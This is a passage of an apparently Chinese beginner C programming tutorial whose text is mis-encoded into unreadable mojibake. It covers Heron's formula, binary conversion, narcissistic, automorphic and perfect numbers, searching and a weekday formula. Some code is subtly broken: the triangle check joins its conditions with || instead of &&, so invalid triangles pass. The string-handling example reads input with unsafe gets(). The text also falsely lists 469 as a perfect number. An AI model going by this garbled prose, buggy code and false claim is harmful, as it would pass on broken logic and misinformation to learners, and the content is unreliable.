å…±%dä¸ªï¼\n&quot;</span>,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/3.jpg"></p>
<h2 id="è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯"><a href="#è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯" class="headerlink" title="è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯"></a>è®¡ç®—ä¸‰è§’å½¢çš„ç±»å‹å’Œé¢ç§¯</h2><h3 id="æµ·ä¼¦å…¬å¼ï¼š"><a href="#æµ·ä¼¦å…¬å¼ï¼š" class="headerlink" title="æµ·ä¼¦å…¬å¼ï¼š"></a>æµ·ä¼¦å…¬å¼ï¼š</h3><p>æµ·ä¼¦å…¬å¼ï¼Œä¼ è¯´ä¸­æ˜¯å¤ä»£çš„å™æ‹‰å¤å›½ç‹å¸Œä¼¦äºŒä¸–å‘ç°çš„å…¬å¼ï¼Œåˆ©ç”¨ä¸‰è§’å½¢çš„ä¸‰è¾¹æ¥æ±‚ä¸‰è§’å½¢çš„é¢ç§¯ï¼Œä½†åäººæ±‚è¯å‡ºæ­¤å…¬å¼å…¶å®æ˜¯ <strong>é˜¿åŸºç±³å¾·</strong>è¿™ä¸ªè€å¤´å‘ç°çš„ï¼  ï¼ˆè¯¦ç»†æƒ…å†µè¯·è‡ªè¡Œç™¾ç§‘ï¼šï¼‰  </p>
<p>ps:ä¸­å›½å®‹ä»£çš„æ•°å­¦å®¶ç§¦ä¹éŸ¶åœ¨1247å¹´ç‹¬ç«‹æå‡ºäº†â€œä¸‰æ–œæ±‚ç§¯æœ¯â€ </p>
<!--more-->

<p>ä¸€ä¸ªä¸‰è§’å½¢ ä¸‰è¾¹åˆ†åˆ«ä¸ºï¼š aã€bã€cï¼Œsä¸ºé¢ç§¯  </p>
<p><em>s=(a+b+c)/2</em>  </p>
<p><em>s=æ ¹å·{s(s-a)(s-b)(s-c)}</em> </p>
<p>æ­¤å…¬å¼å°±æ‘†è„±äº† é«˜ä¸åº•  </p>
<h3 id="includeâ€math-hâ€"><a href="#includeâ€math-hâ€" class="headerlink" title="#includeâ€math.hâ€"></a>#includeâ€math.hâ€</h3><p><strong>&lt;math.h&gt;</strong> å¤´æ–‡ä»¶åŒ…å«äº†ä¸€ç³»åˆ—ä¸æ•°å­¦è®¡ç®—ç›¸å…³çš„å‡½æ•°å’Œå®ã€‚  </p>
<h3 id="sqrt-å¹³æ–¹æ ¹è®¡ç®—"><a href="#sqrt-å¹³æ–¹æ ¹è®¡ç®—" class="headerlink" title="sqrt(å¹³æ–¹æ ¹è®¡ç®—)"></a>sqrt(å¹³æ–¹æ ¹è®¡ç®—)</h3><p>sqrt å°±æ˜¯å…¬å¼ä¸­çš„æ ¹å·ï¼Œç”¨æ³•ï¼š sqrt(xxxx)</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;math.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a,b,c,area,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸‰è§’å½¢çš„ä¸‰è¾¹é•¿ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%f%f%f&quot;</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c||a+c&gt;b||b+c&gt;a)<span class="comment">// ä¸¤è¾¹ä¹‹å’Œå¤§äºç¬¬ä¸‰è¾¹ </span></span><br><span class="line">		&#123;</span><br><span class="line">			s=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">			area=(<span class="keyword">float</span>)<span class="built_in">sqrt</span>(s*(s-a)*(s-b)*(s-c));<span class="comment">//æµ·ä¼¦å…¬å¼ </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ä¸‰è§’å½¢çš„é¢ç§¯ï¼š%f\n&quot;</span>,area);</span><br><span class="line">			<span class="keyword">if</span>(a==b&amp;&amp;a==c)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šç­‰è¾¹ä¸‰è§’å½¢ï¼\n&quot;</span>);	<span class="comment">//åˆ¤æ–­ç­‰è¾¹ </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a==b||a==c||b==c)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šç­‰è…°ä¸‰è§’å½¢ï¼\n&quot;</span>);<span class="comment">//åˆ¤æ–­ç­‰è…° </span></span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(a*a+b*b==c*c||a*a+c*c==b*b||b*b+c*c==a*a) <span class="comment">//åˆ¤æ–­ç›´è§’ </span></span><br><span class="line">			 			<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šç›´è§’ä¸‰è§’å½¢ï¼\n&quot;</span>);</span><br><span class="line">					  <span class="keyword">else</span>	</span><br><span class="line">					  	<span class="built_in">printf</span>(<span class="string">&quot;æ­¤ä¸ºï¼šæ™®é€šä¸‰è§’å½¢ï¼\n&quot;</span>);<span class="comment">//å…¶ä»–æ™®é€šä¸‰è§’å½¢ </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ä¸èƒ½æ„æˆä¸‰è§’å½¢ï¼\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/333.jpg"></p>
<h2 id="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶"><a href="#åè¿›åˆ¶è½¬äºŒè¿›åˆ¶" class="headerlink" title="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶"></a>åè¿›åˆ¶è½¬äºŒè¿›åˆ¶</h2><p>ç¼–å†™ä¸€ä¸ªCç¨‹åºå®ç°è¿›åˆ¶è½¬æ¢ï¼š  </p>
<p>10 to 2:</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoe</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,e=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(number)</span><br><span class="line">	&#123;</span><br><span class="line">		sum+=number%<span class="number">2</span>*e;</span><br><span class="line">		number/=<span class="number">2</span>;</span><br><span class="line">		e*=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">long</span> y=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼š&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	y=stoe(x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åè¿›åˆ¶ï¼š%d\näºŒè¿›åˆ¶%ld\n&quot;</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/33.png"></p>
<h2 id="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„"><a href="#åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„" class="headerlink" title="åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„"></a>åè¿›åˆ¶è½¬äºŒè¿›åˆ¶æ•°ç»„</h2><p>ç¼–å†™ä¸€ä¸ªcç¨‹åºå®ç°ä½¿ç”¨æ•°ç»„è¿›è¡Œè¿›åˆ¶è½¬æ¢ï¼š  </p>
<p>10 to 2ï¼š  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i=<span class="number">0</span>,x;	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;please enter number:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åè¿›åˆ¶:%d\n&quot;</span>,x);</span><br><span class="line">	<span class="keyword">while</span>(x)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=x%<span class="number">2</span>;</span><br><span class="line">			x/=<span class="number">2</span>;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;äºŒè¿›åˆ¶:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i--;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/4.png"></p>
<h2 id="æ°´ä»™èŠ±"><a href="#æ°´ä»™èŠ±" class="headerlink" title="æ°´ä»™èŠ±"></a>æ°´ä»™èŠ±</h2><p>æ°´ä»™èŠ±æ•°ï¼ˆNarcissistic numberï¼‰ä¹Ÿè¢«ç§°ä¸ºè¶…å®Œå…¨æ•°å­—ä¸å˜æ•°ï¼ˆpluperfect digital invariant, PPDIï¼‰ã€è‡ªæ‹æ•°ã€è‡ªå¹‚æ•°ã€é˜¿å§†æ–¯å£®æ•°æˆ–é˜¿å§†æ–¯ç‰¹æœ—æ•°ï¼ˆArmstrong numberï¼‰ï¼Œæ°´ä»™èŠ±æ•°æ˜¯æŒ‡ä¸€ä¸ª 3 ä½æ•°ï¼Œå®ƒçš„æ¯ä¸ªä½ä¸Šçš„æ•°å­—çš„ 3æ¬¡å¹‚ä¹‹å’Œç­‰äºå®ƒæœ¬èº«ï¼ˆä¾‹å¦‚ï¼š1^3 + 5^3+ 3^3 = 153ï¼‰ã€‚  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">sxh</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b,c,s;</span><br><span class="line">		a=x%<span class="number">10</span>;</span><br><span class="line">		b=x/<span class="number">10</span>%<span class="number">10</span>;</span><br><span class="line">		c=x/<span class="number">100</span>;</span><br><span class="line">		s=a*a*a+b*b*b+c*c*c;</span><br><span class="line">		<span class="keyword">if</span>(x==s)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ‰€æœ‰çš„æ°´ä»™èŠ±ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(x=<span class="number">100</span>;x&lt;=<span class="number">999</span>;x++)			</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(sxh(x))</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,x);</span><br><span class="line">		&#125;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/5.png"></p>
<h2 id="é¡ºåºæŸ¥æ‰¾"><a href="#é¡ºåºæŸ¥æ‰¾" class="headerlink" title="é¡ºåºæŸ¥æ‰¾"></a>é¡ºåºæŸ¥æ‰¾</h2><p>è¾“å…¥ä¸€ä¸ªæ•°ï¼Œç¡®å®šå®ƒåœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ•°è¾“å‡º-1ï¼Œå¦åˆ™è¾“å‡ºå®ƒçš„ä¸‹æ ‡ï¼</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ•°ç»„ï¼š&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nè¯·è¾“å…¥ä½ è¦æŸ¥æ‰¾çš„æ•°å­—ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="keyword">if</span>(a[i]==x)</span><br><span class="line">			<span class="keyword">break</span>;			</span><br><span class="line">	<span class="keyword">if</span>(i&lt;N)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dçš„ä¸‹æ ‡ä¸º%d\n&quot;</span>,x,i);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/666.jpg"></p>
<h2 id="æå–æ•°å­—æˆ–å­—æ¯"><a href="#æå–æ•°å­—æˆ–å­—æ¯" class="headerlink" title="æå–æ•°å­—æˆ–å­—æ¯"></a>æå–æ•°å­—æˆ–å­—æ¯</h2><p>è¾“å…¥ä¸€ä¸²å­—ç¬¦æå–å…¶ä¸­çš„æ•°å­—æˆ–å­—æ¯ï¼  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=j=<span class="number">0</span>;ch[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//if(ch[i]&gt;=&#x27;a&#x27;&amp;&amp;ch[i]&lt;=&#x27;z&#x27;||ch[i]&gt;=&#x27;A&#x27;&amp;&amp;ch[i]&lt;=&#x27;Z&#x27;) //æå–å­—æ¯ </span></span><br><span class="line">			<span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch[i]&lt;=<span class="string">&#x27;9&#x27;</span>)<span class="comment">//æå–æ•°å­— </span></span><br><span class="line">				&#123;</span><br><span class="line">					ch[j]=ch[i];</span><br><span class="line">					j++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	ch[j]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/zm.jpg"></p>
<h2 id="åŒæ„æ•°"><a href="#åŒæ„æ•°" class="headerlink" title="åŒæ„æ•°"></a>åŒæ„æ•°</h2><p>æ­£æ•´æ•°nè‹¥æ˜¯å®ƒå¹³æ–¹æ•°çš„å°¾éƒ¨ï¼Œåˆ™ç§°nä¸ºåŒæ„æ•°ã€‚  </p>
<p>ä¾‹å¦‚ï¼š5çš„å¹³æ–¹æ•°æ˜¯25ï¼Œä¸”5å‡ºç°åœ¨25çš„å³ä¾§ï¼Œé‚£ä¹ˆ5å°±æ˜¯ä¸€ä¸ªåŒæ„æ•°.ã€‚  </p>
<p>è¾“å‡º 1000 ä»¥å†…çš„åŒæ„æ•°ï¼š  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d å†…çš„åŒæ„æ•°ï¼š\n&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			s=i*i;</span><br><span class="line">			<span class="keyword">if</span>(s%<span class="number">10</span>==i||s%<span class="number">100</span>==i||s%<span class="number">1000</span>==i)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%d---%d &quot;</span>,i,s);</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/t.jpg"></p>
<h2 id="åŒæ„æ•°-1"><a href="#åŒæ„æ•°-1" class="headerlink" title="åŒæ„æ•°"></a>åŒæ„æ•°</h2><p>æ­£æ•´æ•°nè‹¥æ˜¯å®ƒå¹³æ–¹æ•°çš„å°¾éƒ¨ï¼Œåˆ™ç§°nä¸ºåŒæ„æ•°ã€‚  </p>
<p>ä¾‹å¦‚ï¼š5çš„å¹³æ–¹æ•°æ˜¯25ï¼Œä¸”5å‡ºç°åœ¨25çš„å³ä¾§ï¼Œé‚£ä¹ˆ5å°±æ˜¯ä¸€ä¸ªåŒæ„æ•°.ã€‚  </p>
<p>è¾“å‡º 1000 ä»¥å†…çš„åŒæ„æ•°ï¼š</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(t(i)==<span class="number">1</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pp=<span class="number">0</span>;</span><br><span class="line">	pp=n*n;</span><br><span class="line">	<span class="keyword">while</span>(n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(n%<span class="number">10</span>!=pp%<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		n/=<span class="number">10</span>;</span><br><span class="line">		pp/=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/tong.jpg"></p>
<h2 id="å®Œå…¨æ•°ï¼ˆPerfect-numberï¼‰"><a href="#å®Œå…¨æ•°ï¼ˆPerfect-numberï¼‰" class="headerlink" title="å®Œå…¨æ•°ï¼ˆPerfect numberï¼‰"></a>å®Œå…¨æ•°ï¼ˆPerfect numberï¼‰</h2><p>åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºå®Œå…¨æ•°ï¼ˆPerfect numberï¼‰  </p>
<p>å¦‚æœä¸€ä¸ªæ•°æ°å¥½ç­‰äºå®ƒçš„å› å­ä¹‹å’Œï¼Œåˆ™ç§°è¯¥æ•°ä¸ºâ€œå®Œå…¨æ•°â€  </p>
<p>å¦‚ï¼š 6 ï¼Œ28, 469 â€¦â€¦  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number,sum=<span class="number">0</span>,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;number);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">				sum+=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(number==sum)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dæ˜¯å®Œæ•°\n&quot;</span>,number);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%dä¸æ˜¯å®Œæ•°\n&quot;</span>,number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š </p>
<p><img src="/2019/08/12/OLD/01.jpg"></p>
<h2 id="åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼"><a href="#åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼" class="headerlink" title="åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼"></a>åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼</h2><p>é€šè¿‡ä½¿ç”¨åŸºå§†æ‹‰å°”æ£®è®¡ç®—å…¬å¼è®¡ç®—æ˜ŸæœŸå‡ ï¼ï¼ï¼  </p>
<p>W= (d+2<em>m+3</em>(m+1)/5+y+y/4-y/100+y/400+1)%7   </p>
<p>å…¬å¼ä¸­dè¡¨ç¤ºæ—¥æœŸä¸­çš„æ—¥æ•°ï¼Œmè¡¨ç¤ºæœˆä»½æ•°ï¼Œyè¡¨ç¤ºå¹´æ•°  </p>
<p><strong>æ³¨æ„</strong>ï¼šæŠŠä¸€æœˆå’ŒäºŒæœˆçœ‹æˆæ˜¯ä¸Šä¸€å¹´çš„åä¸‰æœˆå’Œåå››æœˆï¼Œä¾‹ï¼šå¦‚æœæ˜¯2004-1-10åˆ™æ¢ç®—æˆï¼š2003-13-10æ¥ä»£å…¥å…¬å¼è®¡ç®—ã€‚</p>
<p>æºä»£ç ï¼š  </p>
<h2 id="â‘ ï¼š"><a href="#â‘ ï¼š" class="headerlink" title="â‘ ï¼š"></a>â‘ ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *weekday[<span class="number">7</span>]=&#123;<span class="string">&quot;Sunday&quot;</span>,<span class="string">&quot;Monday&quot;</span>,<span class="string">&quot;Tuesday&quot;</span>,<span class="string">&quot;Wednesday&quot;</span>,<span class="string">&quot;Thursday&quot;</span>,<span class="string">&quot;Friday&quot;</span>,<span class="string">&quot;Saturday&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,w;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥å¹´/æœˆ/æ—¥:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	w=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d :%s\n&quot;</span>,year,month,day,weekday[w]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="â‘¡ï¼š"><a href="#â‘¡ï¼š" class="headerlink" title="â‘¡ï¼š"></a>â‘¡ï¼š</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,weekday;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥å¹´/æœˆ/æ—¥:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span 